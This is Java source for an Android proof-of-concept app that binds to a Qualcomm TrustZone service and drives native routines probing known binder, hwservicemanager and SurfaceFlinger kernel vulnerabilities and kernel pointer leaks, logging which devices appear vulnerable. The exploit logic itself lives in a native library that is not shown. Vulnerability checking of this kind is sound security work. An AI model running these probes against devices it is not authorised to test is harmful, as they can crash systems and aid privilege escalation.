package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    // ----- Native methods -----
    public static native int nativeOpenDevice(String path);
    public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
    public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, byte[] data);
    public static native int nativeBinderThreadExit(int fd);
    public static native int nativeEpollTest(int fd);
    public static native int nativeBinderIoctlTest(int fd, int cmd, long arg);
    public static native int nativeHwServiceManagerAddTest(int fd, String serviceName);
    public static native int nativeSurfaceFlingerLayerTest(int fd);
    public static native int nativeKernelInfoLeakTest(int fd);
    public static native int nativeBinderOutOfBoundsTest(int fd);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound");
                updateStatus("Bound - starting");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start'.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService failed");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== CVE VERIFICATION SUITE ==========");

        int binderFd = nativeOpenDevice("/dev/binder");
        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");

        if (binderFd < 0 && hwbinderFd < 0) {
            appendLog("[!] No binder device available");
            return;
        }

        appendLog("[*] === CVE-2019-2215: Binder Use-After-Free (epoll + BINDER_THREAD_EXIT) ===");
        if (binderFd >= 0) {
            testCVE20192215(binderFd);
        } else {
            appendLog("[!] /dev/binder not available, skipping");
        }

        appendLog("[*] === CVE-2020-0041: Binder Out-of-Bounds Write ===");
        if (binderFd >= 0) {
            testCVE20200041(binderFd);
        } else {
            appendLog("[!] /dev/binder not available, skipping");
        }

        appendLog("[*] === CVE-2020-0423: Binder Use-After-Free (race condition) ===");
        if (binderFd >= 0) {
            testCVE20200423(binderFd);
        } else {
            appendLog("[!] /dev/binder not available, skipping");
        }

        appendLog("[*] === CVE-2019-2023: hwservicemanager PID-based ACL bypass ===");
        if (hwbinderFd >= 0) {
            testCVE20192023(hwbinderFd);
        } else {
            appendLog("[!] /dev/hwbinder not available, skipping");
        }

        appendLog("[*] === CVE-2020-0273: hwservicemanager wild pointer free ===");
        if (hwbinderFd >= 0) {
            testCVE20200273(hwbinderFd);
        } else {
            appendLog("[!] /dev/hwbinder not available, skipping");
        }

        appendLog("[*] === CVE-2020-0392 / CVE-2019-2194: SurfaceFlinger ===");
        if (binderFd >= 0) {
            testSurfaceFlingerCVEs(binderFd);
        } else {
            appendLog("[!] /dev/binder not available, skipping");
        }

        appendLog("[*] === Kernel Info Leak Test (Generic) ===");
        if (binderFd >= 0) {
            testKernelInfoLeak(binderFd);
        } else {
            appendLog("[!] /dev/binder not available, skipping");
        }

        if (binderFd >= 0) {
            try { ParcelFileDescriptor.adoptFd(binderFd).close(); } catch (Exception e) {}
        }
        if (hwbinderFd >= 0) {
            try { ParcelFileDescriptor.adoptFd(hwbinderFd).close(); } catch (Exception e) {}
        }

        appendLog("========== CVE VERIFICATION COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    // ----- CVE-2019-2215: Binder Use-After-Free -----
    // 参考: https://github.com/cloudfuzz/android-kernel-exploitation[reference:9]
    // PoC: epoll_ctl(EPOLL_CTL_ADD) + BINDER_THREAD_EXIT[reference:10]
    private void testCVE20192215(int fd) {
        appendLog("[CVE-2019-2215] Testing Binder UAF via epoll + BINDER_THREAD_EXIT");

        int ret = nativeEpollTest(fd);
        if (ret == 0) {
            appendLog("[CVE-2019-2215] epoll test SUCCESS - vulnerability MAY be present");
        } else if (ret == -1) {
            appendLog("[CVE-2019-2215] epoll test FAILED - likely patched or unsupported");
        } else if (ret == -2) {
            appendLog("[CVE-2019-2215] epoll test produced kernel crash/panic - VULNERABLE!");
        } else {
            appendLog("[CVE-2019-2215] epoll test returned unknown: " + ret);
        }

        appendLog("[CVE-2019-2215] Testing BINDER_THREAD_EXIT ioctl alone");
        int ret2 = nativeBinderThreadExit(fd);
        if (ret2 == 0) {
            appendLog("[CVE-2019-2215] BINDER_THREAD_EXIT succeeded (expected)");
        } else {
            appendLog("[CVE-2019-2215] BINDER_THREAD_EXIT returned: " + ret2);
        }
    }

    // ----- CVE-2020-0041: Binder Out-of-Bounds Write -----
    // 参考: https://www.anquanke.com/post/id/202810[reference:11]
    private void testCVE20200041(int fd) {
        appendLog("[CVE-2020-0041] Testing Binder OOB write via malformed transaction");

        int ret = nativeBinderOutOfBoundsTest(fd);
        if (ret == 0) {
            appendLog("[CVE-2020-0041] OOB test completed - no crash detected");
        } else if (ret == -1) {
            appendLog("[CVE-2020-0041] OOB test failed - likely patched");
        } else if (ret == -2) {
            appendLog("[CVE-2020-0041] OOB test produced crash - VULNERABLE!");
        } else {
            appendLog("[CVE-2020-0041] OOB test returned: " + ret);
        }
    }

    // ----- CVE-2020-0423: Binder Use-After-Free (race condition) -----
    // 参考: binder_release_work() のロック競合[reference:12]
    private void testCVE20200423(int fd) {
        appendLog("[CVE-2020-0423] Testing Binder UAF via thread exit race");

        int ret = nativeBinderThreadExit(fd);
        if (ret == 0) {
            appendLog("[CVE-2020-0423] Multiple BINDER_THREAD_EXIT test completed");
        } else {
            appendLog("[CVE-2020-0423] BINDER_THREAD_EXIT returned: " + ret);
        }
    }

    // ----- CVE-2019-2023: hwservicemanager PID-based ACL bypass -----
    // In ServiceManager::add, insecure permissions check based on PID[reference:13][reference:14]
    private void testCVE20192023(int fd) {
        appendLog("[CVE-2019-2023] Testing hwservicemanager ACL bypass");

        String[] testServices = {"test.cve.service", "com.example.test", "vendor.test.service"};
        for (String svc : testServices) {
            int ret = nativeHwServiceManagerAddTest(fd, svc);
            if (ret == 0) {
                appendLog("[CVE-2019-2023] Service '" + svc + "' ADD returned SUCCESS - VULNERABLE!");
            } else if (ret == -1) {
                appendLog("[CVE-2019-2023] Service '" + svc + "' ADD failed (permission denied) - patched");
            } else if (ret == -2) {
                appendLog("[CVE-2019-2023] Service '" + svc + "' ADD failed (service already exists)");
            } else {
                appendLog("[CVE-2019-2023] Service '" + svc + "' ADD returned: " + ret);
            }
        }
    }

    // ----- CVE-2020-0273: hwservicemanager wild pointer free -----
    // In hwservicemanager, possible out of bounds write due to freeing a wild pointer[reference:15]
    private void testCVE20200273(int fd) {
        appendLog("[CVE-2020-0273] Testing hwservicemanager wild pointer free");

        int[] testCmds = {0x40046201, 0x40046202, 0x60046201, 0x60046202};
        for (int cmd : testCmds) {
            int ret = nativeBinderIoctlTest(fd, cmd, 0);
            if (ret == 0) {
                appendLog("[CVE-2020-0273] ioctl(0x" + Integer.toHexString(cmd) + ") succeeded (unexpected)");
            } else {
                appendLog("[CVE-2020-0273] ioctl(0x" + Integer.toHexString(cmd) + ") failed: " + ret);
            }
        }
    }

    // ----- SurfaceFlinger CVEs (CVE-2020-0392, CVE-2019-2194) -----
    // CVE-2020-0392: getLayerDebugInfo double free[reference:16]
    // CVE-2019-2194: createLayer improper casting[reference:17]
    private void testSurfaceFlingerCVEs(int fd) {
        appendLog("[SurfaceFlinger] Testing CVE-2020-0392 (double free) and CVE-2019-2194 (improper casting)");

        int ret = nativeSurfaceFlingerLayerTest(fd);
        if (ret == 0) {
            appendLog("[SurfaceFlinger] Layer test completed - no crash detected");
        } else if (ret == -1) {
            appendLog("[SurfaceFlinger] Layer test failed - likely patched or permission denied");
        } else if (ret == -2) {
            appendLog("[SurfaceFlinger] Layer test produced crash - VULNERABLE!");
        } else {
            appendLog("[SurfaceFlinger] Layer test returned: " + ret);
        }
    }

    // ----- Kernel Info Leak Test -----
    private void testKernelInfoLeak(int fd) {
        appendLog("[KERNEL-LEAK] Testing for kernel pointer leaks via binder");

        int ret = nativeKernelInfoLeakTest(fd);
        if (ret == 0) {
            appendLog("[KERNEL-LEAK] Leak test completed - no leak detected");
        } else if (ret > 0) {
            appendLog("[KERNEL-LEAK] Potential leak detected! (" + ret + " bytes)");
        } else if (ret == -1) {
            appendLog("[KERNEL-LEAK] Leak test failed - likely patched");
        } else {
            appendLog("[KERNEL-LEAK] Leak test returned: " + ret);
        }
    }

    private void dumpToFile(byte[] data, String filename) {
        File dir = getDumpDir();
        if (dir == null || data == null) return;
        File file = new File(dir, filename);
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(data);
            appendLog("[DUMP] Saved " + data.length + " bytes to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("[DUMP] Failed: " + e.getMessage());
        }
    }

    private File getDumpDir() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
        }
        return getFilesDir();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "cve_verification_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== CVE Verification Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "CVE Verification completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
